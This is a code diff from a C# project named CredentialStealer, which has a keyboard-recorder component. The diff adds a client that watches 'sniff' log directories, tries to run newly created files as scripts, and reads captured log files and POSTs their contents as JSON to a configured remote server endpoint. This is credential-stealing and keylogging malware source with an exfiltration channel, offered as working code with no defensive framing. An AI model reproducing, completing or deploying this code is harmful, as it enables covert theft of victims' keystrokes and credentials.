@@ -1,6 +1,8 @@
 ﻿using CredentialStealer.Entities;
 using CredentialStealer.KeyboardRecorder;
+using Newtonsoft.Json;
 using System;
+using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Sockets;
@@ -79,19 +81,96 @@ namespace CredentialStealer.Client.Console
             client.Close(); 
         }
 
-       
-
-        public void SendInfosToServer(string content,IPEndPoint serverEndPoint)
-        {
-
-        }
-
-        public Client()
+        public static string SendInfosToServer(string content)
         {
             IPEndPoint serverEndPoint = new IPEndPoint(IPAddress.Parse(IP), PORT);
+            string result = null;
+            var httpWebRequest = (HttpWebRequest)WebRequest.Create(System.Configuration.ConfigurationManager.AppSettings["ServerEndPoint"]);
+            httpWebRequest.ContentType = "application/json";
+            httpWebRequest.Method = "POST";
+
+            Guid gui = new Guid();
+            using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
+            {
+                var userData = new CredentialData();
+                userData.uid = gui.ToString();
+                userData.other = content;
+                string json = JsonConvert.SerializeObject(userData);
+
+                streamWriter.Write(json);
+                streamWriter.Flush();
+                streamWriter.Close();
+
+                var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
+                using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
+                {
+                    result = streamReader.ReadToEnd();
+                }
+            }
+            return result;
+        }
+
+
+        private static void OnChangedToAnalyse(object source, FileSystemEventArgs e)
+        {
+            // Specify what is done when a file is changed, created, or deleted.
+            System.Console.WriteLine("Found sniff file to analyse: " + e.FullPath + " " + e.ChangeType);
+            ExecutePythonScripts(e.FullPath);
+        }
+
+        private static void OnChangedToSend(object source, FileSystemEventArgs e)
+        {
+            // Specify what is done when a file is changed, created, or deleted.
+            System.Console.WriteLine("Found sniff file to send: " + e.FullPath + " " + e.ChangeType);
+            string content = File.ReadAllText(e.FullPath);
+            SendInfosToServer(content);
+        }
+
+        private static void ExecutePythonScripts(string fileName)
+        {
+            // Use ProcessStartInfo class
+            ProcessStartInfo startInfo = new ProcessStartInfo();
+            startInfo.CreateNoWindow = false;
+            startInfo.UseShellExecute = false;
+            startInfo.FileName = fileName;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            startInfo.Arguments = String.Format("{0}",fileName);
+
             try
             {
+                System.Console.WriteLine("Execute Python");
+                // Start the process with the info we specified.
+                // Call WaitForExit and then the using statement will close.
+                //using (Process exeProcess = Process.Start(startInfo))
+                {
+                    //exeProcess.WaitForExit();
+                }
+            }
+            catch
+            {
+                // Log error.
+            }
+        }
+        public Client()
+        {
+            try
+            {
+                //Listen D1 files and execute python scripts
+                FileSystemWatcher watcher = new FileSystemWatcher();
+                watcher.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffDir"];
+                watcher.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.DirectoryName;
+                watcher.Filter = "*.*";
+                watcher.Created += new FileSystemEventHandler(OnChangedToAnalyse);
+                watcher.EnableRaisingEvents = true;
 
+                FileSystemWatcher watcher2 = new FileSystemWatcher();
+                watcher2.Path = System.Configuration.ConfigurationManager.AppSettings["LogSniffAnalysedDir"];
+                watcher2.NotifyFilter = NotifyFilters.FileName; //| NotifyFilters.DirectoryName;
+                watcher2.Filter = "*.*";
+                watcher2.Created += new FileSystemEventHandler(OnChangedToSend);
+                watcher2.EnableRaisingEvents = true;
+
+                while (System.Console.Read() != 'q') ;
 
             }
             catch (Exception ex)
